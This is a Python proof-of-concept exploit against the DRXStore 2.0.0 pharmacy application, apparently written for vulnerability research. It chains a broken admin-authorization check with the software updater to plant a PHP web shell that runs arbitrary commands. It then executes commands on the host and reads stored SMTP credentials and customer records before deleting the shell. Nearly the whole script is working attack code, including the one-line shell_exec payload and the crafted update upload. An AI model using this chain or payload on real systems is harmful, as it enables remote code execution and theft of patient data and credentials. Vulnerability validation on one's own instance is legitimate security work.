#!/usr/bin/env python3
"""
DRXStore 2.0.0 - IMPACT proof of concept
========================================
Chain:  staff account  ->  admin-only page (broken requireAdmin)  ->  arbitrary PHP in the
        web root (software updater)  ->  OS command execution + access to pharmacy data.

    python3 poc_impact.py [url] [app_dir] [--seed]

Defaults: http://127.0.0.1:8901 and ~/cve-hunt/repro/app.

Works on a cold instance: if the setup wizard has not run, it completes it; if the staff
account does not exist, it creates it as the admin. Every claim is ASSERTED - if the app is
not vulnerable, or not running, this exits non-zero instead of printing a comforting label.

--seed  creates two sample customers and an SMTP config through the app's own admin UI so
        the impact section has real data to read. Labelled in the output as seeded.

The uploaded payload is a single-line command runner. It deletes itself at the end and the
deletion is verified. Validation tool, not a backdoor - own instance only.
"""
import glob, http.cookiejar, io, json, os, re, sys, tempfile, urllib.error
import urllib.parse, urllib.request, uuid, zipfile

ARGS = [a for a in sys.argv[1:] if not a.startswith("--")]
FLAGS = {a for a in sys.argv[1:] if a.startswith("--")}
BASE = (ARGS[0] if ARGS else "http://127.0.0.1:8901").rstrip("/")
APP = (ARGS[1] if len(ARGS) > 1 else os.path.expanduser("~/cve-hunt/repro/app")).rstrip("/")
USER, PASS = "staff1", "StaffPass123"
ADMIN, ADMIN_PASS = "admin", "AdminPass123"
SEED = "--seed" in FLAGS
SHELL = "drx_impact.php"
PAYLOAD = ('<?php /* validation payload - deletes itself */ '
           'if (isset($_GET["c"])) { echo shell_exec($_GET["c"]." 2>&1"); } ?>')


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class Client:
    def __init__(self):
        self.cj = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self.cj), NoRedirect()]
        proxy = os.environ.get("http_proxy") or os.environ.get("HTTP_PROXY")
        if proxy:
            handlers.insert(0, urllib.request.ProxyHandler({"http": proxy}))
        self.op = urllib.request.build_opener(*handlers)

    def req(self, path, data=None, raw=None, ctype=None):
        if raw is not None:
            r = urllib.request.Request(BASE + path, data=raw, method="POST",
                                       headers={"Content-Type": ctype})
        else:
            body = urllib.parse.urlencode(data).encode() if data else None
            r = urllib.request.Request(BASE + path, data=body,
                                       method="POST" if data else "GET")
        try:
            x = self.op.open(r, timeout=90)
            return x.getcode(), x.read().decode("utf8", "ignore")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf8", "ignore")
        except urllib.error.URLError as e:
            die(f"cannot reach {BASE} ({e.reason})",
                "the app has to be running first.  In another terminal:\n"
                "     bash ~/cve-hunt/start-app.sh")

    def phpsessid(self):
        for c in self.cj:
            if c.name == "PHPSESSID":
                return c.value
        return None


def die(msg, hint=None):
    print(f"\n[!] {msg}")
    if hint:
        print(f"\n    {hint}")
    sys.exit(1)


def csrf(html):
    m = re.search(r'name="csrf_token"\s+value="([a-f0-9]+)"', html)
    return m.group(1) if m else None


def rule(title):
    print(f"\n{'=' * 68}\n{title}\n{'=' * 68}")


def run_wizard(sh):
    """Complete the first-run wizard so the instance has an admin."""
    _, h = sh.req("/index.php?p=setup")
    if not csrf(h):
        return                                    # already set up
    print("    fresh instance -> completing setup wizard as admin/AdminPass123")
    sh.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "1",
        "store_name": "POC Pharmacy", "store_email": "poc@example.test", "store_address": "x",
        "store_phone": "1", "store_gst": "", "store_dl": "", "currency": "$"})
    _, h = sh.req("/index.php?p=setup&step=2")
    sh.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "2", "full_name": "Admin",
        "username": ADMIN, "email": "admin@example.test", "password": ADMIN_PASS,
        "confirm": ADMIN_PASS})
    _, h = sh.req("/index.php?p=setup&step=3")
    sh.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "3", "driver": "json"})
    _, h = sh.req("/index.php?p=setup&step=4")
    sh.req("/index.php?p=setup", {"csrf_token": csrf(h), "step": "4"})


def do_login(sh, user, pw):
    """True only if the session actually ends up authenticated."""
    sh.req("/index.php?p=login")
    _, h = sh.req("/index.php?p=login")
    sh.req("/index.php?p=login", {"csrf_token": csrf(h), "login": user, "password": pw})
    code, _ = sh.req("/index.php?p=dashboard")
    return code == 200


def create_staff(sh):
    _, h = sh.req("/index.php?p=users")
    sh.req("/index.php?p=users", {"csrf_token": csrf(h), "action": "add_staff",
        "name": "Staff One", "username": USER, "email": "staff1@example.test",
        "password": PASS, "role": "staff"})


def session_role(sh):
    """Read the role from the server-side session file - independent of any HTML label."""
    sid = sh.phpsessid()
    if not sid:
        return None
    for f in glob.glob(os.path.join(tempfile.gettempdir(), f"sess_{sid}")):
        try:
            data = open(f, errors="ignore").read()
        except OSError:
            continue
        m = re.search(r'admin_role\|s:\d+:"([^"]+)"', data)
        if m:
            return m.group(1)
    return None


def run(sh, cmd):
    code, out = sh.req(f"/{SHELL}?" + urllib.parse.urlencode({"c": cmd}))
    return out.strip() if code == 200 else f"<failed: HTTP {code}>"


def build_package():
    for f in ("index.php", "config/app.php"):
        if not os.path.exists(os.path.join(APP, f)):
            die(f"app dir looks wrong: {APP}",
                "pass the directory of the instance under test as the 2nd argument.")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("drxstore/index.php", open(os.path.join(APP, "index.php")).read())
        z.writestr("drxstore/config/app.php", open(os.path.join(APP, "config/app.php")).read())
        z.writestr(f"drxstore/{SHELL}", PAYLOAD)
        pad = zipfile.ZipInfo("drxstore/assets/pad.bin")
        pad.compress_type = zipfile.ZIP_STORED
        z.writestr(pad, os.urandom(70000))          # updater rejects anything under 50 000 bytes
    return buf.getvalue()


def main():
    rule("0. who am I")
    sh = Client()
    run_wizard(sh)

    if not do_login(sh, USER, PASS):
        print(f"    {USER} cannot log in -> creating it as the admin first")
        if not do_login(sh, ADMIN, ADMIN_PASS):
            die("cannot log in as admin either",
                "is this really a DRXStore instance? check the URL and the app dir.")
        create_staff(sh)
        sh.req("/index.php?p=logout")
        if not do_login(sh, USER, PASS):
            die(f"staff account {USER} was created but login still fails")

    role = session_role(sh)
    if role is None:
        die("logged in, but could not read the role from the session file",
            f"expected a session file under {tempfile.gettempdir()}. "
            "If PHP keeps sessions elsewhere, this check cannot run - say so rather than guessing.")
    print(f"    logged in as : {USER}")
    print(f"    role         : {role}   (read from the server-side session: admin_role)")
    if role != "staff":
        die(f"this account is '{role}', not 'staff' - the escalation below would be meaningless",
            "recreate the staff account, or point this at a clean instance.")

    if SEED:
        print("    seeding 2 sample customers + SMTP through the admin UI, for the impact demo")
        if do_login(sh, ADMIN, ADMIN_PASS):
            for n, ph, em in (("Ramesh Kulkarni", "9820011223", "ramesh.k@example.test"),
                              ("Sunita Deshpande", "9930044556", "sunita.d@example.test")):
                _, h = sh.req("/index.php?p=customers")
                sh.req("/index.php?p=customers", {"csrf_token": csrf(h), "action": "add", "id": "0",
                    "name": n, "phone": ph, "email": em, "address": "Pune", "dob": "1985-04-11"})
            _, h = sh.req("/index.php?p=settings")
            sh.req("/index.php?p=settings", {"csrf_token": csrf(h), "action": "smtp",
                "smtp_host": "smtp.gmail.com", "smtp_port": "587",
                "smtp_user": "billing@example-pharmacy.test",
                "smtp_pass": "Demo-Only-App-Password-9931",
                "smtp_from": "billing@example-pharmacy.test", "smtp_name": "POC Pharmacy",
                "smtp_secure": "tls"})
            sh.req("/index.php?p=logout")
            do_login(sh, USER, PASS)
        else:
            print("    [!] could not log in as admin to seed - continuing without sample data")

    rule("1. staff reaches admin-only pages  [broken requireAdmin, CWE-862]")
    failures = 0
    for page in ("users", "settings", "sw_update"):
        code, body = sh.req(f"/index.php?p={page}")
        ok = code == 200
        failures += 0 if ok else 1
        print(f"    GET ?p={page:10s} -> HTTP {code}  ({len(body)} bytes)  {'ADMIN UI' if ok else 'blocked'}")
    if failures:
        die(f"{failures} admin page(s) were NOT reachable as staff",
            "this instance does not show the bug - check the version/commit you are testing.")
    print("    none of those appear in STAFF_ALLOWED_PAGES -> authorization bypass confirmed")

    rule("2. drop our code into the web root  [CWE-434]")
    pkg = build_package()
    print(f"    package      : {len(pkg)} bytes (payload + the two 'release' files)")
    _, page = sh.req("/index.php?p=sw_update")
    b = "----x" + uuid.uuid4().hex
    body = b"".join([
        f'--{b}\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\n{csrf(page)}\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload_update\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="update_zip"; filename="update.zip"\r\n'
        f'Content-Type: application/zip\r\n\r\n'.encode() + pkg + b"\r\n",
        f"--{b}--\r\n".encode()])
    code, resp = sh.req("/index.php?p=sw_update", raw=body,
                        ctype=f"multipart/form-data; boundary={b}")
    accepted = "Apply Update" in resp
    print(f"    upload       : HTTP {code}   accepted={accepted}")
    if not accepted:
        alerts = [re.sub(r"<[^>]+>", "", a).strip()
                  for a in re.findall(r'alert-body">(.*?)</span>', resp, re.S)]
        die("the updater rejected the package", f"alerts: {alerts[:2] or '(empty response)'}")
    code, _ = sh.req("/index.php?p=sw_update",
                     {"csrf_token": csrf(resp), "action": "apply_update"})
    on_disk = os.path.exists(os.path.join(APP, SHELL))
    print(f"    apply        : HTTP {code}   file written={on_disk}")
    if not on_disk:
        die("apply returned but the file is not on disk",
            "the apply step is atomic-ish; check session state and retry from step 2.")

    rule("3. execute commands on the host  [this is the RCE]")
    code, out = sh.req(f"/{SHELL}?" + urllib.parse.urlencode({"c": "id"}))
    if code != 200 or "uid=" not in out:
        die(f"payload did not execute (HTTP {code})", "the file is on disk but not being served")
    for label, cmd in (("identity", "id"), ("host", "uname -a"),
                       ("app root", f"ls -la {APP} | head -10")):
        print(f"\n  $ {cmd}          ({label})")
        for line in run(sh, cmd).splitlines()[:10]:
            print(f"    {line}")

    rule("4. what the attacker takes  [impact]")
    print("\n  stored SMTP credentials (data/settings.json):")
    try:
        cfg = json.loads(run(sh, f"cat {APP}/data/settings.json"))
        if isinstance(cfg, list):
            cfg = cfg[0] if cfg else {}
        shown_any = False
        for k in ("store_name", "smtp_host", "smtp_user", "smtp_pass"):
            if cfg.get(k):
                shown_any = True
                v = cfg[k]
                print(f"    {k:11s}: {('*** leaked, %d chars ***' % len(str(v))) if k == 'smtp_pass' else v}")
        if not shown_any:
            print("    (nothing configured on this instance - run with --seed for a full demo)")
    except Exception as e:
        print(f"    <could not parse: {e}>")

    print("\n  patient / customer records (data/customers.json):")
    raw = run(sh, f"cat {APP}/data/customers.json")
    try:
        cust = json.loads(raw)
    except Exception:
        cust = []                      # file absent on a fresh instance - not an error
    if not cust:
        print("    (none on this instance - run with --seed for a full demo)")
    else:
        print(f"    {len(cust)} customer records readable")
        for c in cust[:3]:
            print(f"    - {c.get('name','?'):20s} {c.get('phone','?'):13s} {c.get('email','?')}")

    rule("5. clean up")
    run(sh, f"rm -f {APP}/{SHELL}")
    code, _ = sh.req(f"/{SHELL}")
    gone = code != 200
    print(f"  GET /{SHELL} -> HTTP {code}   {'removed' if gone else 'STILL PRESENT'}")
    if not gone:
        die("the payload file could not be removed - delete it by hand", f"rm -f {APP}/{SHELL}")


if __name__ == "__main__":
    main()
